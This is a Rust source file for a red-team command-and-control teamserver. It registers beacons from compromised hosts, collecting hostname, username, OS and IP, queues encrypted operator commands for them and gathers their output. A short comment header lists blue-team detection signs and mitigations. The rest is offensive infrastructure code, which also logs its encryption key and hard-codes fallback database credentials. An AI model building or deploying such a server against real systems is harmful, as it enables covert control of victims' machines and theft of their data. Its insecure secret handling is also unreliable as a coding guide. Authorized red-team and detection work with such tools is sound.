// Red Team C2 Teamserver - High-Performance Async Rust Server
//
// BLUE TEAM DETECTION:
// - Network: Listening on unusual ports
// - Process: Rust binary with network server capabilities
// - Traffic: Encrypted POST/GET patterns from multiple sources
// - Database: PostgreSQL with suspicious table names (beacons, commands, outputs)
//
// MITIGATIONS:
// - Network monitoring: Alert on servers listening on non-standard ports
// - Process monitoring: Track unauthorized server processes
// - Database auditing: Monitor for C2-like schema patterns

use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::Json,
    routing::{get, post},
    Router,
};
use serde::{Deserialize, Serialize};
use sqlx::{postgres::PgPoolOptions, PgPool};
use std::sync::Arc;
use tower_http::cors::CorsLayer;
use tracing::{info, warn};
use uuid::Uuid;

mod crypto;
mod database;
mod handlers;

use database::Database;

// Teamserver State - shared across all handlers
#[derive(Clone)]
pub struct AppState {
    db: Arc<Database>,
    crypto_key: Vec<u8>,
}

// Beacon registration data
#[derive(Debug, Deserialize, Serialize)]
pub struct BeaconCheckin {
    beacon_id: String,
    timestamp: i64,
    hostname: Option<String>,
    username: Option<String>,
    os: Option<String>,
    ip: Option<String>,
    data: Option<String>, // Encrypted system info
    metadata: Option<serde_json::Value>,
}

// Command structure
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct Command {
    pub command_id: String,
    pub command_type: String,
    pub command_data: String, // Encrypted command payload
    pub metadata: Option<serde_json::Value>,
}

// Output from beacon
#[derive(Debug, Deserialize, Serialize)]
pub struct BeaconOutput {
    beacon_id: String,
    timestamp: i64,
    data: String, // Encrypted output
    metadata: Option<serde_json::Value>,
}

// Operator command submission
#[derive(Debug, Deserialize, Serialize)]
pub struct OperatorCommand {
    beacon_id: String,
    command_type: String,
    command_data: String,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize tracing
    tracing_subscriber::fmt()
        .with_env_filter("teamserver=debug,tower_http=debug")
        .init();

    info!("╔═══════════════════════════════════════════════════════╗");
    info!("║      Red Team C2 Teamserver v1.0.0                   ║");
    info!("║      High-Performance Rust Backend                   ║");
    info!("║                                                       ║");
    info!("║  ⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠           ║");
    info!("╚═══════════════════════════════════════════════════════╝");

    // Load configuration from environment
    dotenvy::dotenv().ok();
    let database_url = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| "postgres://c2user:c2password@localhost/c2_database".to_string());

    let server_addr = std::env::var("SERVER_ADDR")
        .unwrap_or_else(|_| "0.0.0.0:8443".to_string());

    // Connect to database
    info!("Connecting to database...");
    let pool = PgPoolOptions::new()
        .max_connections(50)
        .connect(&database_url)
        .await?;

    // Run migrations
    info!("Running database migrations...");
    sqlx::migrate!("./migrations").run(&pool).await?;

    // Initialize database layer
    let db = Arc::new(Database::new(pool));

    // Generate or load crypto key (32 bytes for ChaCha20)
    let crypto_key = crypto::generate_key();
    info!("Encryption key: {}", hex::encode(&crypto_key));

    // Create application state
    let state = AppState {
        db: db.clone(),
        crypto_key,
    };

    // Build router
    let app = Router::new()
        // Beacon endpoints
        .route("/api/beacon/:beacon_id/checkin", post(handlers::beacon_checkin))
        .route("/api/beacon/:beacon_id/output", post(handlers::beacon_output))
        .route("/api/commands/:beacon_id", get(handlers::get_commands))

        // Operator endpoints
        .route("/api/operator/beacons", get(handlers::list_beacons))
        .route("/api/operator/command", post(handlers::submit_command))
        .route("/api/operator/outputs/:beacon_id", get(handlers::get_outputs))

        // Health check
        .route("/health", get(|| async { "OK" }))

        .layer(CorsLayer::permissive())
        .with_state(state);

    // Start server
    info!("Starting server on {}", server_addr);
    let listener = tokio::net::TcpListener::bind(&server_addr).await?;

    info!("╔═══════════════════════════════════════════════════════╗");
    info!("║  Teamserver running and ready for beacons            ║");
    info!("║  Listening on: {}                            ║", server_addr);
    info!("╚═══════════════════════════════════════════════════════╝");

    axum::serve(listener, app).await?;

    Ok(())
}
